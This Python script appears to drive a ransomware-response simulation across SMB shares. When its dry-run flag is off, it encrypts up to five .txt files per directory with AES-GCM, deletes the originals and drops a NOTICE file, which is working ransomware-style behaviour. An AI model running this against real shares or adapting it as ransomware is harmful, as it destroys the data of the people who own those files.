"""
Loop over multiple SMB shares, find all .txt files in each configured directory,
create "<file>.simulation" with different content, then delete the original .txt.

Works with smbclient versions where:
- smbclient.path.join does NOT exist
- register_session() does NOT accept 'domain'

Requirements:
  pip install smbprotocol smbclient pyyaml

Run:
  python smb_simulate.py --config config.yml
"""

import os
import sys
import secrets
import logging
from logging.handlers import RotatingFileHandler
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import argparse
import datetime as dt
from dataclasses import dataclass
from typing import Any, Optional
import random

import yaml
from smbclient import listdir, open_file, register_session, remove, stat
from smbclient.path import isdir

SALT_LEN = 16  # bytes
NONCE_LEN = 12  # bytes (recommended for GCM)

def setup_logging(log_path: str) -> logging.Logger:
    logger = logging.getLogger("smb_simulate")
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')

    # Avoid duplicate handlers if setup_logging is called multiple times
    if not logger.handlers:
        # Console handler
        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        logger.addHandler(ch)

        # File handler
        fh = RotatingFileHandler(log_path, maxBytes=5*1024*1024, backupCount=2)
        fh.setFormatter(formatter)
        logger.addHandler(fh)

    return logger

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=200_000,
    )
    return kdf.derive(password.encode("utf-8"))

def encrypt_bytes(plaintext: bytes, password: str) -> bytes:
    salt = secrets.token_bytes(SALT_LEN)
    nonce = secrets.token_bytes(NONCE_LEN)
    key = derive_key(password, salt)

    aesgcm = AESGCM(key)
    ct_and_tag = aesgcm.encrypt(nonce, plaintext, associated_data=None)
    return salt + nonce + ct_and_tag

def decrypt_bytes(blob: bytes, password: str) -> bytes:
    if len(blob) < SALT_LEN + NONCE_LEN + 16:
        raise ValueError("Input too short / not a valid blob")
    salt = blob[:SALT_LEN]
    nonce = blob[SALT_LEN : SALT_LEN + NONCE_LEN]
    ct_and_tag = blob[SALT_LEN + NONCE_LEN :]
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ct_and_tag, associated_data=None)

@dataclass
class ShareConfig:
    server: str
    share: str
    directory: str = ""
    username: Optional[str] = None
    password: Optional[str] = None
    enc_key: str = ""
    fake_run: bool = True  # Default to True unless specified
    file_pick: str = "random"  # "random", "latest", or "earliest"

def smb_join(*parts: str) -> str:
    if not parts:
        return ""
    first = parts[0] or ""
    unc_prefix = first.startswith("\\\\")
    cleaned: list[str] = []
    for p in parts:
        if p is None:
            continue
        p = str(p).strip()
        if not p:
            continue
        p = p.replace("/", "\\")
        cleaned.append(p.strip("\\"))
    if not cleaned:
        return ""
    head = cleaned[0]
    if unc_prefix:
        head = "\\\\" + head
    if len(cleaned) == 1:
        return head
    return head + "\\" + "\\".join(cleaned[1:])

def _load_config(path: str) -> tuple[list[ShareConfig], str]:
    with open(path, "r", encoding="utf-8") as f:
        data: dict[str, Any] = yaml.safe_load(f) or {}
    shares = data.get("shares", [])
    if not isinstance(shares, list) or not shares:
        raise ValueError("Config must contain a non-empty 'shares' list")
    out: list[ShareConfig] = []
    for s in shares:
        out.append(
            ShareConfig(
                server=s["server"],
                share=s["share"],
                directory=s.get("directory", "") or "",
                username=s.get("username"),
                password=s.get("password"),
                enc_key=s.get("enc_key", "default"),
                fake_run=s.get("fake_run", True),
                file_pick=s.get("file_pick", "random"),
            )
        )
    log_path = data.get("log_path", "smb_simulate.log")
    log_path = os.path.expandvars(os.path.expanduser(log_path))
    log_path = os.path.abspath(log_path)
    return out, log_path

def _unc_root(server: str, share: str) -> str:
    return rf"\\{server}\{share}"

def _base_dir(sc: ShareConfig) -> str:
    root = _unc_root(sc.server, sc.share)
    return smb_join(root, sc.directory) if sc.directory else root

def _ensure_session(sc: ShareConfig, seen: set[str]) -> None:
    if sc.server in seen:
        return
    register_session(sc.server, username=sc.username, password=sc.password)
    seen.add(sc.server)

def process_txt_files(sc: ShareConfig, logger: logging.Logger):
    base_dir = _base_dir(sc)
    if not isdir(base_dir):
        logger.warning(f"Skipping (not a directory): {base_dir} [endpoint: {sc.server}]")
        return

    txt_files = [name for name in listdir(base_dir) if name.lower().endswith(".txt")]
    if not txt_files:
        logger.info(f"No .txt files found in {base_dir} [endpoint: {sc.server}]")
        return

    selected_files = []
    if sc.file_pick in ("latest", "earliest"):
        files_with_mtime = []
        for name in txt_files:
            path = smb_join(base_dir, name)
            try:
                mtime = stat(path).st_mtime
            except Exception as e:
                logger.warning(f"Could not stat {path}: {e}")
                continue
            files_with_mtime.append((name, mtime))
        reverse = sc.file_pick == "latest"
        selected_files = [name for name, _ in sorted(files_with_mtime, key=lambda x: x[1], reverse=reverse)[:5]]
    else:  # random or unknown
        selected_files = random.sample(txt_files, min(5, len(txt_files)))

    logger.info(f"Selected files for {sc.file_pick} {'fake' if sc.fake_run else 'real'} encryption in {base_dir} [endpoint: {sc.server}]: {selected_files}")

    for name in selected_files:
        txt_path = smb_join(base_dir, name)
        sim_path = txt_path + ".simulation"

        with open_file(txt_path, mode="r", encoding="utf-8") as fd:
            original = fd.read()
            encrypted_content = encrypt_bytes(original.encode("utf-8"), sc.enc_key)

        simulation_content = (
            "SIMULATION FILE\n"
            f"source={txt_path}\n"
            f"generated_at={dt.datetime.utcnow().isoformat()}Z\n"
            "\n--- original content ---\n"
            f"{original}\n"
        )

        if sc.fake_run:
            logger.info(f"[FAKE RUN] Would create: {sim_path} [endpoint: {sc.server}]")
            logger.info(f"[FAKE RUN] Would delete: {txt_path} [endpoint: {sc.server}]")
        else:
            with open_file(sim_path, mode="wb", encoding="utf-8") as fd:
                fd.write(encrypted_content)
            remove(txt_path)
            logger.info(f"[{sc.server}] Created: {sim_path} [endpoint: {sc.server}]")
            logger.info(f"[{sc.server}] Deleted: {txt_path} [endpoint: {sc.server}]")

    notice_path = f"{base_dir}/NOTICE"
    if sc.fake_run:
        logger.info(f"[FAKE RUN] Would write NOTICE file at {notice_path} [endpoint: {sc.server}]")
    else:
        with open_file(notice_path, mode="w", encoding="utf-8") as fd:
            fd.write(
                """HACKATHON RECOVERY SIMULATION EXERCISE NOTICE: Authorized ransomware-response simulation only.
No data has been exfiltrated. Only dummy data is used. Do not pay or contact external parties."""
            )

def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--config", required=True, help="Path to YAML config file")
    args = ap.parse_args()

    shares, log_path = _load_config(args.config)
    logger = setup_logging(log_path)
    seen_servers: set[str] = set()

    for sc in shares:
        _ensure_session(sc, seen_servers)
        process_txt_files(sc, logger)

    return 0

if __name__ == "__main__":
    raise SystemExit(main())

